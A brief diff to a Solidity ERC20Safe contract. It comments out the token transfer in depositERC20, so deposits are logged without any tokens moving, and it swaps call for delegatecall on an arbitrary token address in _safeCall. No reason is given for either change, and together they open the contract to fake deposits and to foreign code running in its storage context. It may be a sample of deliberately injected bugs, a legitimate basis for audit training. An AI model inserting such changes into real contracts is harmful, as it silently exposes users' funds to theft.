@@ -21,7 +21,7 @@ contract ERC20Safe {
    */
     function depositERC20(address tokenAddress, uint256 amount) public {
         IERC20 erc20 = IERC20(tokenAddress);
-        _safeTransferFrom(erc20, msg.sender, address(this), amount);
+        // _safeTransferFrom(erc20, msg.sender, address(this), amount);
         emit ERC20Deposited(tokenAddress, msg.sender, amount);
     }
 
@@ -34,7 +34,7 @@ contract ERC20Safe {
     }
 
     function _safeCall(IERC20 token, bytes memory data) private {        
-        (bool success, bytes memory returndata) = address(token).call(data);
+        (bool success, bytes memory returndata) = address(token).delegatecall(data);
         require(success, "ERC20: call failed");
 
         if (returndata.length > 0) {
